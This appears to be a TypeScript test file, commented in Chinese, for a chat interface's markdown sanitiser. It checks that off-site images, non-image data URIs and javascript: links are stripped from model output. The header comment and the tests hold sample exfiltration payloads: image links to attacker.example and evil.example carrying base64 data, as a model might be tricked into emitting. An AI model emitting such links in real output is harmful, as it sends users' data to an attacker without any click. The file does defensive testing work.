/**
 * 输出收敛（防护批② B2-T12/B2-T13/B2-T14）：图片与链接的来源约束。
 *
 * <p>威胁面：模型输出一句 `![](https://attacker/?d=<base64>)` 就能让浏览器<b>无需用户点击</b>
 * 自动出网（MSRC 列的第一种外泄手法）。因此图片只认同源与 `data:image/*`；链接保留 http/https
 * 但必须带 `rel="noopener noreferrer nofollow"`，站外另加可见标记（自绘 svg，禁 emoji）。
 */
import { describe, expect, it } from 'vitest'
import { renderMarkdown, isAllowedImageSrc, isExternalHref } from '@/utils/markdown'

function html(markdown: string): string {
  return renderMarkdown(markdown, false).html
}

describe('图片外链收敛（B2-T12）', () => {
  it('站外图片被整条剥掉（不留空 img 壳）', () => {
    const out = html('看图 ![x](https://attacker.example/x.png?d=c2VjcmV0)')

    expect(out).not.toContain('attacker.example')
    expect(out).not.toContain('<img')
  })

  it('协议相对地址（//host）同样按站外处理', () => {
    expect(isAllowedImageSrc('//evil.example/a.png')).toBe(false)
  })

  it('data:image/png 零误伤（保留可渲染）', () => {
    const out = html('![像素](data:image/png;base64,iVBORw0KGgoAAAANSUhEUg==)')

    expect(out).toContain('<img')
    expect(out).toContain('data:image/png')
  })

  it('非图片 data:（含 svg）一律剥掉', () => {
    expect(isAllowedImageSrc('data:text/html;base64,PHNjcmlwdD4=')).toBe(false)
    expect(isAllowedImageSrc('data:image/svg+xml;base64,PHN2Zz4=')).toBe(false)
    expect(html('![s](data:text/html;base64,PHNjcmlwdD4=)')).not.toContain('<img')
  })

  it('同源图片（/api/file/…）零误伤', () => {
    const out = html('![附件](/api/file/42)')

    expect(out).toContain('src="/api/file/42"')
  })
})

describe('外链收敛（B2-T13）', () => {
  it('站外 http(s) 链接：保留 href + rel + 新窗口 + 可见标记', () => {
    const out = html('[文档](https://example.com/doc)')

    expect(out).toContain('href="https://example.com/doc"')
    expect(out).toContain('rel="noopener noreferrer nofollow"')
    expect(out).toContain('target="_blank"')
    expect(out).toContain('md-ext-link')
    expect(out).toContain('md-ext-icon')
  })

  it('站内相对链接：保留 href 与 rel，但不加外链标记', () => {
    const out = html('[本页](/api/ai/health)')

    expect(out).toContain('href="/api/ai/health"')
    expect(out).toContain('rel="noopener noreferrer nofollow"')
    expect(out).not.toContain('md-ext-link')
  })

  it('javascript: 协议被剥（不产生可点击的 href）', () => {
    const out = html('[点我](javascript:alert(1))')

    expect(out).not.toContain('href="javascript:')
  })

  it('外链判据：同源 http 不算外链', () => {
    expect(isExternalHref('https://example.com/a')).toBe(true)
    expect(isExternalHref('/api/ai/health')).toBe(false)
  })
})

describe('可见文案禁 emoji（用户裁决第 10 条）', () => {
  it('外链标记是自绘 svg，不含 emoji 字符', () => {
    const out = html('[a](https://example.com)')

    expect(out).toContain('<svg')
    expect(out).not.toMatch(/[\u2190-\u21FF\u2600-\u27BF\u{1F300}-\u{1FAFF}]/u)
  })
})
